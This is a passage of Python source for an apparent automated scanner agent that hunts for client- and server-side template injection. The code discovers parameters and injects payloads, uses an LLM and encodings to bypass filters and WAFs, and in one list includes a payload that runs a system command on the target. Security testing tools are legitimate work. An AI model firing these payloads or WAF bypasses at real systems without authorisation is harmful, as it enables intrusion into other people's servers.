            await self._cleanup_scan()
        except Exception as e:
            logger.error(f"CSTIAgent error: {e}", exc_info=True)

        dashboard.log(f"[{self.name}] ✅ Complete. Findings: {len(all_findings)}", "SUCCESS")
        return {"findings": all_findings, "status": JobStatus.COMPLETED}

    async def _prepare_scan(self):
        """Prepare for template injection scan.

        IMPROVED (2026-02-06): AUTONOMOUS SPECIALIST PATTERN v1.0
        - Discovers ALL params from URL query + HTML forms
        - Prioritizes CSTI-related params (template, message, content, subject, body)
        - Detects template engine framework (Angular, Vue, Jinja2, etc.)

        IMPROVED (2026-01-30): Auto-discover params from URL and HTML.
        FIXED (2026-02-01): URL query params are FIRST-CLASS citizens (before provided params).
        """
        # AUTONOMOUS DISCOVERY: Fetch HTML and extract ALL testable params
        try:
            discovered_params_dict = await self._discover_csti_params(self.url)

            # Convert to list format and prioritize CSTI-related params
            discovered_params = self._prioritize_csti_params(discovered_params_dict)

        except Exception as e:
            logger.error(f"[{self.name}] Autonomous discovery failed: {e}, falling back to old method")
            # Fallback to old sync method if async discovery fails
            discovered_params = self._discover_all_params()

        # FIXED: URL query params come FIRST, then merge with provided params
        discovered_names = {p.get("parameter") for p in discovered_params}

        # Add provided params that aren't already discovered
        for p in self.params:
            if p.get("parameter") not in discovered_names:
                discovered_params.append(p)

        # CSTI-specific prioritization already applied in _prioritize_csti_params()
        # No need for double prioritization - the autonomous method already orders params
        self.params = discovered_params

        # Log what we're testing
        param_names = [p.get("parameter") for p in self.params]
        logger.info(f"[{self.name}] 🎯 Parameters to test (CSTI-prioritized): {param_names}")
        dashboard.log(f"[{self.name}] Testing {len(self.params)} params: {param_names[:5]}{'...' if len(param_names) > 5 else ''}", "INFO")

        await self._detect_waf_async()
        await self._setup_interactsh()

    async def _discover_csti_params(self, url: str) -> Dict[str, str]:
        """
        CSTI-focused parameter discovery (AUTONOMOUS SPECIALIST PATTERN v1.0).

        Extracts ALL testable parameters from:
        1. URL query string
        2. HTML forms (input, textarea, select) - template content
        3. Prioritizes CSTI-related param names (template, message, content, subject, body)

        Returns:
            Dict mapping param names to default values
            Example: {"category": "Juice", "template": "", "message": ""}

        Architecture Note:
            Specialists must be AUTONOMOUS - they discover their own attack surface.
            The finding from DASTySAST is just a "signal" that the URL is interesting.
            We IGNORE the specific parameter and test ALL discoverable params.

        Ref: .ai-context/SPECIALIST_AUTONOMY_PATTERN.md
        """
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        from bs4 import BeautifulSoup

        all_params = {}

        # 1. Extract URL query parameters
        try:
            parsed = urlparse(url)
            url_params = parse_qs(parsed.query)
            for param_name, values in url_params.items():
                all_params[param_name] = values[0] if values else ""
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to parse URL params: {e}")

        # 2. Fetch HTML and extract form parameters
        try:
            state = await browser_manager.capture_state(url)
            html = state.get("html", "")

            if html:
                soup = BeautifulSoup(html, "html.parser")

                # Extract from <input>, <textarea>, <select> with name attribute
                for tag in soup.find_all(["input", "textarea", "select"]):
                    param_name = tag.get("name")
                    if param_name and param_name not in all_params:
                        # Exclude CSRF tokens and submit buttons
                        input_type = tag.get("type", "text").lower()
                        if input_type not in ["submit", "button", "reset"]:
                            if "csrf" not in param_name.lower() and "token" not in param_name.lower():
                                # Get default value
                                default_value = tag.get("value", "")
                                all_params[param_name] = default_value

                # 3. Extract params from <a> href links (same-origin only)
                parsed_base = urlparse(url)
                for a_tag in soup.find_all("a", href=True):
                    href = a_tag["href"]
                    if href.startswith(("javascript:", "mailto:", "#", "tel:")):
                        continue
                    try:
                        from urllib.parse import urljoin
                        resolved = urljoin(url, href)
                        parsed_href = urlparse(resolved)
                        if parsed_href.netloc and parsed_href.netloc != parsed_base.netloc:
                            continue
                        href_params = parse_qs(parsed_href.query)
                        for p_name, p_vals in href_params.items():
                            if p_name not in all_params and "csrf" not in p_name.lower() and "token" not in p_name.lower():
                                all_params[p_name] = p_vals[0] if p_vals else ""
                    except Exception:
                        continue

                # 4. CSTI-specific: Detect template engine in use
                detected_engines = TemplateEngineFingerprinter.fingerprint(html)
                if detected_engines and detected_engines[0] != "unknown":
                    logger.info(f"[{self.name}] 🔍 Detected template engine(s): {', '.join(detected_engines)}")

        except Exception as e:
            logger.error(f"[{self.name}] HTML parsing failed: {e}")

        logger.info(f"[{self.name}] 🔍 Discovered {len(all_params)} params on {url}: {list(all_params.keys())}")
        return all_params

    def _prioritize_csti_params(self, all_params: Dict[str, str]) -> List[Dict]:
        """
        Prioritize CSTI-related parameter names.

        High Priority: template, message, content, subject, body, text, comment, description
        Medium Priority: search, q, query, name, title
        Low Priority: all others
        """
        CSTI_HIGH_PRIORITY = ["template", "message", "content", "subject", "body", "text", "comment", "description", "email_body", "sms_body"]
        CSTI_MEDIUM_PRIORITY = ["search", "q", "query", "name", "title", "view", "page", "lang", "theme"]

        prioritized = []

        # 1. High priority params first
        for param_name in CSTI_HIGH_PRIORITY:
            if param_name in all_params:
                prioritized.append({"parameter": param_name, "source": "html_form_high_priority"})

        # 2. Medium priority params
        for param_name in CSTI_MEDIUM_PRIORITY:
            if param_name in all_params and param_name not in [p["parameter"] for p in prioritized]:
                prioritized.append({"parameter": param_name, "source": "html_form_medium_priority"})

        # 3. All other discovered params
        for param_name in all_params.keys():
            if param_name not in [p["parameter"] for p in prioritized]:
                prioritized.append({"parameter": param_name, "source": "html_form_discovered"})

        logger.info(f"[{self.name}] 🎯 Prioritized {len(prioritized)} params for CSTI testing")
        return prioritized

    def _discover_all_params(self) -> List[Dict]:
        """
        DEPRECATED (2026-02-06): Use _discover_csti_params() instead (async).

        This method is kept for backwards compatibility but should be replaced
        with the async autonomous discovery pattern.

        ADDED (2026-01-30): Auto-discover ALL testable parameters.
        IMPROVED (2026-02-01): URL query params are first-class citizens (no path filtering).

        Sources:
        1. URL query string params (ALWAYS - first-class)
        2. Common vulnerable param names (ALWAYS - for comprehensive coverage)
        """
        discovered = []

        # 1. Extract from URL query string (ALWAYS - first-class citizens)
        parsed = urlparse(self.url)
        query_params = parse_qs(parsed.query)
        for param_name in query_params.keys():
            discovered.append({"parameter": param_name, "source": "url_query"})
            logger.info(f"[{self.name}] 🎯 URL Query Param (first-class): {param_name}")

        # 2. ALWAYS add common vulnerable params for comprehensive coverage
        # FIXED (2026-02-01): Removed path filtering - Burp tests these on ALL endpoints
        common_vuln_params = ["category", "search", "q", "query", "filter", "sort",
                              "template", "view", "page", "lang", "theme", "type", "action"]
        for param in common_vuln_params:
            if param not in query_params:
                discovered.append({"parameter": param, "source": "common_vuln"})
                logger.debug(f"[{self.name}] Added common vuln param: {param}")

        return discovered

    async def _scan_all_parameters(self) -> List[Dict]:
        """Scan all parameters for template injection."""
        all_findings = []
        # Use HTTPClientManager for proper connection management (v2.4)
        async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
            html = await self._fetch_page(session)
            all_findings = await self._test_all_params(session, html)
        return all_findings

    async def _test_all_params(self, session, html: str) -> List[Dict]:
        """Test all parameters with session and HTML (Parallel Mode)."""
        all_findings = []
        
        # Parallel optimization: Process up to 5 parameters concurrently
        semaphore = asyncio.Semaphore(5)
        
        async def _worker(item):
            async with semaphore:
                if self._max_impact_achieved:
                    return []
                return await self._test_parameter(session, item, html)

        tasks = [_worker(item) for item in self.params]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            all_findings.extend(r)
            
        return all_findings

    async def _validate(
        self,
        param: str,
        payload: str,
        response_html: str,
        screenshots_dir: Path
    ) -> tuple:
        """
        4-LEVEL VALIDATION PIPELINE (V2.0) - CSTI/SSTI Alignment
        Ref: BugTraceAI-CLI/docs/architecture/xss-validation-pipeline.md

        v3.2 FIX: For JS-rendered sites (empty response_html), skip L1/L2 and go
        directly to L3 Playwright for client-side payloads (Angular, Vue).
        """
        evidence = {"payload": payload}

        # v3.2 FIX: Detect JS-rendered site and client-side payload
        response_len = len(response_html.strip())
        is_js_rendered = response_len < 500
        is_client_side_payload = any(marker in payload for marker in ["{{", "${", "constructor", "$eval", "$on"])

        logger.info(f"[{self.name}] CSTI _validate: response_len={response_len}, is_js_rendered={is_js_rendered}, is_client_side={is_client_side_payload}")

        if is_js_rendered and is_client_side_payload:
            logger.info(f"[{self.name}] JS-rendered site + client-side payload - skipping L1/L2, going to L3 Playwright")
            # Skip L1/L2, go directly to L3 for client-side CSTI on JS-rendered sites
            if await self._validate_with_playwright(param, payload, screenshots_dir, evidence):
                return True, evidence
            logger.debug(f"[{self.name}] L3 Playwright failed for JS-rendered CSTI, escalating to L4")
            return False, evidence

        # Standard flow for server-side or non-JS sites
        # Level 1: HTTP Static Reflection Check (Arithmetic/Signatures)
        logger.info(f"[{self.name}] L1 checking: {payload[:40]}...")
        try:
            l1_result = await self._validate_http_reflection(param, payload, response_html, evidence)
            if l1_result:
                logger.info(f"[{self.name}] L1 CONFIRMED: {evidence.get('method')}")
                return True, evidence
            logger.info(f"[{self.name}] L1 returned False")
        except Exception as e:
            logger.warning(f"[{self.name}] L1 exception: {e}")
        logger.info(f"[{self.name}] L1 failed, trying L2")

        # Level 2: AI-Powered Manipulator (Logic Evasion)
        try:
            l2_result = await self._validate_with_ai_manipulator(param, payload, response_html, evidence)
            if l2_result:
                logger.info(f"[{self.name}] L2 CONFIRMED")
                return True, evidence
        except Exception as e:
            logger.warning(f"[{self.name}] L2 exception: {e}")
        logger.info(f"[{self.name}] L2 failed, trying L3 Playwright")

        # Level 3: Playwright Browser Execution (Client-side engines)
        try:
            l3_result = await self._validate_with_playwright(param, payload, screenshots_dir, evidence)
            if l3_result:
                return True, evidence
        except Exception as e:
            logger.warning(f"[{self.name}] L3 exception: {e}")

        # Level 4: Escalation (Return False to let Manager/Reactor escalate to AgenticValidator)
        logger.info(f"[{self.name}] L1-L3 all failed for {payload[:40]}")
        return False, evidence

    async def _validate_http_reflection(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
        """Level 1: Fast HTTP static evaluation check."""
        # Tier 1.1: OOB Interactsh (Definitive OOB)
        if await self._check_oob_hit(f"csti_{param}"):
            evidence["method"] = "L1: OOB Interactsh"
            evidence["level"] = 1
            return True

        if not response_html:
            return False

        # Tier 1.2: Signatures and Arithmetic
        # Use existing checks
        async with http_manager.isolated_session(ConnectionProfile.PROBE) as session:
            if await self._check_arithmetic_evaluation(response_html, payload, session, ""):
                evidence["method"] = "L1: Arithmetic Evaluation"
                evidence["level"] = 1
                evidence["status"] = "VALIDATED_CONFIRMED"
                return True

        if self._check_string_multiplication(response_html, payload):
            evidence["method"] = "L1: String Multiplication"
            evidence["level"] = 1
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

        if self._check_config_reflection(response_html, payload):
            evidence["method"] = "L1: Config Reflection"
            evidence["level"] = 1
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

        if self._check_engine_signatures(response_html, payload):
            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.signature_match", {"agent": "CSTI", "payload": payload[:100], "method": "engine_signature"})
            evidence["method"] = "L1: Engine Signature"
            evidence["level"] = 1
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

        if self._check_error_signatures(response_html):
            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.signature_match", {"agent": "CSTI", "payload": payload[:100], "method": "error_signature"})
            evidence["method"] = "L1: Error Signature"
            evidence["level"] = 1
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

        return False

    async def _validate_with_ai_manipulator(self, param: str, payload: str, response_html: str, evidence: Dict) -> bool:
        """Level 2: AI-powered audit of potential evaluation."""
        if not response_html or payload not in response_html:
            return False
            
        # If the exact payload is reflected, maybe it's partially evaluated but masked?
        # Or maybe it's a context where simple arithmetic fails but more complex objects work.
        # Placeholder for AI analysis
        return False

    async def _validate_with_playwright(self, param: str, payload: str, screenshots_dir: Path, evidence: Dict) -> bool:
        """Level 3: Playwright browser execution (Client-side engines like Angular)."""
        attack_url = self._inject(param, payload)

        logger.info(f"[{self.name}] L3 Playwright validating CSTI: {payload[:50]}...")

        # Use verifier pool for efficiency
        from bugtrace.agents.agentic_validator import _verifier_pool
        verifier = await _verifier_pool.get_verifier()
        try:
            # v3.2: Increased timeout for Angular sandbox escapes (they need DOM processing time)
            result = await verifier.verify_xss(
                url=attack_url,
                screenshot_dir=str(screenshots_dir),
                timeout=15.0,  # Increased from 8s for complex Angular payloads
                max_level=3 # Stay at L3 within the agent
            )

            logger.info(f"[{self.name}] L3 Playwright result: success={result.success}, details={result.details}")

            if result.success:
                evidence.update(result.details or {})
                evidence["playwright_confirmed"] = True
                evidence["screenshot_path"] = result.screenshot_path
                evidence["method"] = "L3: Playwright Browser"
                evidence["level"] = 3
                evidence["status"] = "VALIDATED_CONFIRMED"
                return True
        finally:
            _verifier_pool.release()

        return False

    async def _cleanup_scan(self):
        """Cleanup after template injection scan."""
        if self.interactsh:
            await self.interactsh.deregister()

    async def _get_baseline_content(self, session) -> str:
        """Fetch baseline content without injection to check for false positives."""
        try:
            async with session.get(self.url, timeout=5) as resp:
                return await resp.text()
        except Exception as e:
            logger.debug(f"_get_baseline_content failed: {e}")
            return ""

    async def _check_light_reflection(self, session, param: str) -> bool:
        """Quick check if a parameter is reflected at all to avoid wasting LLM costs."""
        probe = "BT7331"
        try:
            content, _ = await self._test_payload(session, param, probe)
            return probe in (content or "")
        except Exception:
            return False

    async def _test_payload(self, session, param, payload) -> Tuple[Optional[str], Optional[str]]:
        """
        Injects payload and performs 4-level validation.
        Returns (content, effective_url) if validated (L1-L3).
        Returns (None, None) if validation fails.

        v3.2.2: Changed to only return content when ACTUALLY validated.
        Escalation to L4 is now handled separately by the caller.
        """
        target_url = self._inject(param, payload)

        # Level 1-2 Check (HTTP)
        try:
            async with session.get(target_url, timeout=5) as resp:
                content = await resp.text()
                final_url = str(resp.url)

                logger.debug(f"[{self.name}] CSTI test: response {len(content)} chars for {payload[:30]}")

                validated, evidence = await self._validate(param, payload, content, Path(settings.LOG_DIR))
                if validated:
                    # L1-L3 confirmed it
                    logger.info(f"[{self.name}] CSTI VALIDATED: {payload[:50]} via {evidence.get('method', 'unknown')}")
                    return content, final_url

                # v3.2.2: Don't return content for escalation - only return when truly validated
                # The L4 escalation should be handled by a separate mechanism (AgenticValidator)
                logger.debug(f"[{self.name}] CSTI L1-L3 failed for {payload[:30]}")

        except Exception as e:
            logger.debug(f"CSTI test error: {e}")

        return None, None

    async def _check_arithmetic_evaluation(self, content: str, payload: str, session, final_url: str) -> bool:
        """Check for arithmetic evaluation (7*7=49)."""
        if "49" not in content:
            return False

        if "7*7" in payload:
            # Payload like {{7*7}} - check 49 present and payload not reflected
            if payload in content:
                return False
            # CRITICAL: Baseline check
            baseline = await self._get_baseline_content(session)
            return "49" not in baseline

        if "{% if" in payload and "49" in payload:
            # Payload like {% if 1 %}49{% endif %} - check syntax stripped
            return "{%" not in content and "%}" not in content

        if "print" in payload:
            return "{%" not in content

        return False

    def _check_string_multiplication(self, content: str, payload: str) -> bool:
        """Check for string multiplication (7777777)."""
        if "7777777" not in content:
            return False
        return "'7'*7" in payload and payload not in content

    def _check_config_reflection(self, content: str, payload: str) -> bool:
        """Check for Config reflection (Jinja2)."""
        if "{{config}}" not in payload:
            return False
        has_config = "Config" in content or "&lt;Config" in content
        return has_config and payload not in content

    def _check_engine_signatures(self, content: str, payload: str) -> bool:
        """Check for engine-specific signatures."""
        # Twig
        if "{{dump(app)}}" in payload or "{{app.request}}" in payload:
            return "Symfony" in content or "Twig" in content

        # Smarty
        if "{$smarty.version}" in payload:
            return re.search(r"Smarty[- ]\d", content) is not None

        # Freemarker
        if "freemarker" in payload.lower():
            return "freemarker" in content.lower()

        return False

    def _check_error_signatures(self, content: str) -> bool:
        """Check for template error signatures."""
        error_signatures = [
            "jinja2.exceptions",
            "Twig_Error_Syntax",
            "FreeMarker template error",
            "VelocityException",
            "org.apache.velocity",
            "mako.exceptions"
        ]
        for sig in error_signatures:
            if sig in content:
                logger.info(f"[{self.name}] 🚨 Template Error Detected: {sig}")
                return True
        return False

    async def _llm_probe(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """Use LLM to generate custom bypasses or target specific engines."""
        self.think(f"Generating advanced bypasses for parameter '{param}'")
        
        user_prompt = f"Target URL: {self.url}\nParameter: {param}\n\nGenerate 5 advanced CSTI/SSTI bypasses for modern engines (Angular, Vue, Jinja2, Mako)."
        
        try:
            response = await llm_client.generate(user_prompt, system_prompt=self.system_prompt, module_name="CSTI_AGENT")
            ai_payloads = XmlParser.extract_list(response, "payload")
            
            # Enrich with WAF bypass
            ai_payloads = await self._get_encoded_payloads(ai_payloads)

            for ap in ai_payloads:
                dashboard.set_current_payload(ap, f"CSTI:{param}", "AI Advanced")
                content, verified_url = await self._test_payload(session, param, ap)
                if content:
                    return self._create_finding(param, ap, "ai_bypass", verified_url=verified_url)
        except Exception as e:
            logger.error(f"CSTI LLM check failed: {e}", exc_info=True)
            
        return None

    def _inject(self, param_name: str, payload: str) -> str:
        parsed = urlparse(self.url)
        q = parse_qs(parsed.query)
        q[param_name] = [payload]
        new_query = urlencode(q, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def _create_finding(self, param: str, payload: str, method: str, verified_url: str = None) -> CSTIFinding:
        """Create a standardized finding object with full authority."""
        logger.info(f"[{self.name}] 🚨 CSTI/SSTI CONFIRMED on {param}: {payload}")
        dashboard.log(f"[{self.name}] 🎯 CSTI/SSTI CONFIRMED on '{param}'!", "SUCCESS")

        # Determine engine from payload if not specified
        engine = self._detect_engine_from_payload(payload)
        engine_type = "client-side" if engine in ["angular", "vue"] else "server-side"
        
        # Use verified URL if available, else fallback to current (though verified should be passed)
        final_url = verified_url or self.url
        
        encoded_url = self._inject(param, payload).replace(self.url, final_url) if verified_url else self._inject(param, payload)
        curl_cmd = f"curl '{encoded_url}' | grep 49"

        return CSTIFinding(
            url=final_url,
            parameter=param,
            payload=payload,
            template_engine=engine,
            engine_type=engine_type,
            payload_syntax=engine,
            verified_url=final_url,
            original_url=self.url,
            arithmetic_proof="7*7" in payload, # Simple heuristic for now
            baseline_check_passed=True, # We now check this in verification
            description=f"Template Injection vulnerability detected. Expression '{payload}' was evaluated by the {engine_type} engine ({engine}). Method: {method}.",
            reproduction_command=curl_cmd,
            reproduction_steps=self._generate_repro_steps(final_url, param, payload, curl_cmd),
            evidence={
                "method": method,
                "proof": "Arithmetic evaluation detected (7*7=49) or specific engine behavior verified.",
                "engine": engine
            }
        )

    def _create_ambiguous_finding(self, param: str, payload: str, engine: str) -> Dict:
        # Keeping this as Dict for now as it's not a confirmed finding? 
        # Actually better to use CSTIFinding but marked as not validated?
        # For minimal diff, let's keep it but ideally we should standardize.
        # But this function returns a Dict in current code.
        # Let's verify usage. It's used to return a Dict.
        # I'll update it to return CSTIFinding but validated=False
        
        logger.info(f"[{self.name}] ⚠️ Potential client-side CSTI on {param} ({engine}) - needs CDP")
        dashboard.log(f"[{self.name}] ⚠️ Potential CSTI on '{param}' ({engine}) - delegating to CDP", "WARN")

        return CSTIFinding(
            url=self.url,
            parameter=param,
            payload=payload,
            type="CSTI",
            severity="MEDIUM",
            template_engine=engine,
            engine_type="client-side",
            validated=False,
            status="PENDING_CDP_VALIDATION",
            reproduction_command=f"# Open in browser: {self._inject(param, payload)}",
            description=f"Potential client-side template injection ({engine}). Template syntax reflected but execution needs browser validation.",
            evidence={
                "engine": engine,
                "needs_cdp": True,
                "reason": f"Client-side framework ({engine}) suspected, needs browser validation"
            }
        )

    async def _feedback_generate_waf_bypass(self, original: str) -> Tuple[Optional[str], str]:
        """Generate WAF bypass variant."""
        encoded = await self._get_encoded_payloads([original])
        if encoded and encoded[0] != original:
            return encoded[0], "waf_bypass"
        return None, ""

    def _feedback_generate_engine_switch(self, engine: str) -> Tuple[Optional[str], str]:
        """Generate engine switch variant."""
        variant = self._try_alternative_engine(engine)
        return variant, "engine_switch"

    def _feedback_generate_char_encoding(self, original: str, stripped_chars: List[str]) -> Tuple[Optional[str], str]:
        """Generate character encoding variant."""
        variant = self._encode_template_chars(original, stripped_chars)
        return variant, "char_encoding"

    async def _feedback_generate_llm_fallback(self, parameter: str) -> Tuple[Optional[str], str]:
        """Generate LLM fallback variant."""
        llm_result = await self._llm_probe(None, parameter)
        if llm_result:
            return llm_result.get('payload'), "llm_fallback"
        return None, ""

    async def handle_validation_feedback(
        self,
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Recibe feedback del AgenticValidator y genera una variante de CSTI.

        Args:
            feedback: Información sobre el fallo de validación

        Returns:
            Diccionario con el nuevo payload, o None
        """
        logger.info(f"[CSTIAgent] Received feedback: {feedback.failure_reason.value}")

        original = feedback.original_payload
        engine = self._detect_engine_from_payload(original)
        variant = None
        method = "feedback_adaptation"

        # Try specific bypass strategies based on failure reason
        if feedback.failure_reason == FailureReason.WAF_BLOCKED:
            variant, method = await self._feedback_generate_waf_bypass(original)
        elif feedback.failure_reason == FailureReason.CONTEXT_MISMATCH:
            variant, method = self._feedback_generate_engine_switch(engine)
        elif feedback.failure_reason == FailureReason.ENCODING_STRIPPED:
            variant, method = self._feedback_generate_char_encoding(original, feedback.stripped_chars)

        # Fallback to LLM if no variant generated
        if not variant or variant == original:
            variant, method = await self._feedback_generate_llm_fallback(feedback.parameter)

        # Return variant if valid and not tried before
        if variant and variant != original and not feedback.was_variant_tried(variant):
            return {
                "payload": variant,
                "method": method,
                "engine_guess": engine
            }

        return None

    def _detect_engine_from_payload(self, payload: str) -> str:
        """Detecta el motor de plantillas basándose en la sintaxis."""
        if '{{' in payload and '}}' in payload:
            return self._detect_curly_brace_engine(payload)
        if '${' in payload:
            return 'freemarker'
        if '#set' in payload or '$!' in payload:
            return 'velocity'
        if '{%' in payload:
            return 'jinja2'
        return 'unknown'

    def _detect_curly_brace_engine(self, payload: str) -> str:
        """Detect engine for curly brace syntax."""
        # AngularJS detection (client-side)
        if 'constructor' in payload.lower() or '$on' in payload or '$eval' in payload:
            return 'angular'

        # Vue.js detection (client-side)
        if '$emit' in payload or 'v-' in payload:
            return 'vue'

        # Jinja2 detection (server-side)
        if '__class__' in payload or 'config' in payload or 'lipsum' in payload:
            return 'jinja2'

        # Mako detection (server-side)
        if '${' in payload or '%>' in payload:
            return 'mako'

        # Check tech_profile from fingerprinting before defaulting
        if hasattr(self, 'tech_profile') and self.tech_profile:
            frameworks = self.tech_profile.get('frameworks', [])
            for fw in frameworks:
                fw_lower = fw.lower()
                if 'angular' in fw_lower:
                    return 'angular'
                if 'vue' in fw_lower:
                    return 'vue'

        # Also check _tech_stack_context (set by queue consumer)
        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
        for fw in tech_stack.get('frameworks', []):
            fw_lower = fw.lower()
            if 'angular' in fw_lower:
                return 'angular'
            if 'vue' in fw_lower:
                return 'vue'

        # Default to twig for unidentified {{ }} syntax (server-side)
        return 'twig'

    def _try_alternative_engine(self, current_engine: str) -> str:
        """Devuelve un payload para un motor diferente."""
        payloads = {
            'jinja2': '{{7*7}}',
            'twig': '{{7*7}}',
            'freemarker': '${7*7}',
            'velocity': '#set($x=7*7)$x',
            'pebble': '{{7*7}}',
            'thymeleaf': '[[${7*7}]]'
        }
        
        # Elegir uno diferente al actual
        for engine, payload in payloads.items():
            if engine != current_engine:
                return payload
        
        return '{{7*7}}'

    def _encode_template_chars(self, payload: str, stripped: List[str]) -> str:
        """Codifica caracteres filtrados en sintaxis de plantilla."""
        result = payload
        
        # Si filtraron llaves, probar con otras sintaxis
        if '{' in stripped or '}' in stripped:
            # Cambiar de {{ a ${
            result = result.replace('{{', '${').replace('}}', '}')
        
        # URL encoding para otros caracteres
        for char in stripped:
            if char not in '{}':
                result = result.replace(char, f'%{ord(char):02X}')
        
        return result
    async def generate_bypass_variant(
        self,
        original_payload: str,
        failure_reason: str,
        waf_signature: Optional[str] = None,
        stripped_chars: Optional[str] = None,
        tried_variants: Optional[List[str]] = None
    ) -> Optional[str]:
        """
        Genera una variante de payload CSTI basada en feedback de fallo.
        
        Este método es llamado por el AgenticValidator cuando un payload falla,
        permitiendo al agente usar su lógica sofisticada de bypass para generar
        una variante que evite el problema detectado.
        
        Args:
            original_payload: El payload que falló
            failure_reason: Razón del fallo (waf_blocked, chars_filtered, etc.)
            waf_signature: Firma del WAF detectado (si aplica)
            stripped_chars: Caracteres que fueron filtrados
            tried_variants: Lista de variantes ya probadas
            
        Returns:
            String con el nuevo payload, o None si no se pudo generar
        """
        logger.info(f"[CSTIAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")

        tried_variants = tried_variants or []
        current_engine = self._detect_engine_from_payload(original_payload)
        logger.info(f"[CSTIAgent] Detected engine from payload: {current_engine}")

        # Try strategies in order
        variant = self._try_waf_bypass(original_payload, waf_signature, tried_variants)
        if variant:
            return variant

        variant = self._try_char_encoding(original_payload, stripped_chars, tried_variants)
        if variant:
            return variant

        variant = self._try_engine_switch(current_engine, tried_variants)
        if variant:
            return variant

        variant = self._try_universal_payloads(tried_variants)
        if variant:
            return variant

        logger.warning("[CSTIAgent] Could not generate new variant (all strategies exhausted)")
        return None

    def _try_waf_bypass(self, original_payload: str, waf_signature: Optional[str], tried_variants: List[str]) -> Optional[str]:
        """Try WAF bypass encoding strategy."""
        if not waf_signature or waf_signature.lower() == "no identificado":
            return None

        logger.info(f"[CSTIAgent] WAF detected ({waf_signature}), using intelligent encoding...")
        encoded_variants = self._get_encoded_payloads([original_payload])

        for variant in encoded_variants:
            if variant not in tried_variants and variant != original_payload:
                logger.info(f"[CSTIAgent] Generated WAF bypass variant: {variant[:80]}...")
                return variant
        return None

    def _try_char_encoding(self, original_payload: str, stripped_chars: Optional[str], tried_variants: List[str]) -> Optional[str]:
        """Try character encoding strategy."""
        if not stripped_chars:
            return None

        logger.info(f"[CSTIAgent] Characters filtered ({stripped_chars}), using template encoding...")
        encoded = self._encode_template_chars(original_payload, list(stripped_chars))

        if encoded not in tried_variants and encoded != original_payload:
            logger.info(f"[CSTIAgent] Generated encoded variant: {encoded[:80]}...")
            return encoded
        return None

    def _try_engine_switch(self, current_engine: str, tried_variants: List[str]) -> Optional[str]:
        """Try alternative engine payload."""
        alternative_payload = self._try_alternative_engine(current_engine)

        if alternative_payload and alternative_payload not in tried_variants:
            logger.info(f"[CSTIAgent] Generated alternative engine variant: {alternative_payload[:80]}...")
            return alternative_payload
        return None

    def _try_universal_payloads(self, tried_variants: List[str]) -> Optional[str]:
        """Try universal CSTI payloads."""
        universal_csti = [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{= 7*7 }}",
            "${{7*7}}", "{{7*'7'}}", "{{config}}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}"
        ]

        for variant in universal_csti:
            if variant not in tried_variants:
                logger.info(f"[CSTIAgent] Generated universal variant: {variant[:80]}...")
                return variant
        return None

    # =========================================================================
    # WET → DRY Two-Phase Processing (Phase A: Deduplication, Phase B: Exploitation)
    # =========================================================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        """
        PHASE A: Drain WET findings from queue and deduplicate using LLM + fingerprint fallback.

        Returns:
            List of DRY (deduplicated) findings
        """
        import asyncio
        import time
        from bugtrace.core.queue import queue_manager

        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")

        queue = queue_manager.get_queue("csti")
        wet_findings = []

        # Wait for queue to have items (timeout 300s)
        wait_start = time.monotonic()
        while (time.monotonic() - wait_start) < 300.0:
            if queue.depth() if hasattr(queue, 'depth') else 0 > 0:
                break
            await asyncio.sleep(0.5)

        # Drain all WET findings from queue
        logger.info(f"[{self.name}] Phase A: Queue has {queue.depth() if hasattr(queue, 'depth') else 0} items, starting drain...")

        stable_empty_count = 0
        drain_start = time.monotonic()

        while stable_empty_count < 10 and (time.monotonic() - drain_start) < 300.0:
            item = await queue.dequeue(timeout=0.5)  # Use dequeue(), not get_nowait()

            if item is None:
                stable_empty_count += 1
                continue

            stable_empty_count = 0

            finding = item.get("finding", {}) if isinstance(item, dict) else {}
            if finding:
                wet_findings.append(finding)

        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings from queue")

        if not wet_findings:
            logger.info(f"[{self.name}] Phase A: No findings to process")
            return []

        # Separate auto-dispatch items from real DASTySAST findings.
        # Auto-dispatch items have precise URL+param combos from the pipeline —
        # they should bypass LLM dedup which can mismatch URLs and params.
        auto_dispatch_items = [f for f in wet_findings if f.get("_auto_dispatched")]
        real_items = [f for f in wet_findings if not f.get("_auto_dispatched")]

        # LLM-powered deduplication (only for real DASTySAST findings)
        if real_items:
            dry_list = await self._llm_analyze_and_dedup(real_items, self._scan_context)
        else:
            dry_list = []

        # Fingerprint-dedup auto-dispatch items and add them
        if auto_dispatch_items:
            existing_fps = set()
            for f in dry_list:
                fp = self._generate_csti_fingerprint(
                    f.get("url", ""), f.get("parameter", ""), f.get("template_engine", "unknown")
                )
                existing_fps.add(fp)

            added = 0
            for f in auto_dispatch_items:
                fp = self._generate_csti_fingerprint(
                    f.get("url", ""), f.get("parameter", ""), f.get("template_engine", "unknown")
                )
                if fp not in existing_fps:
                    existing_fps.add(fp)
                    dry_list.append(f)
                    added += 1
            logger.info(f"[{self.name}] Auto-dispatch bypass: {len(auto_dispatch_items)} items, {added} added to DRY list")

        # Store for later phases
        self._dry_findings = dry_list

        logger.info(f"[{self.name}] Phase A: Deduplication complete. {len(wet_findings)} WET → {len(dry_list)} DRY ({len(wet_findings) - len(dry_list)} duplicates removed)")

        return dry_list

    async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
        """
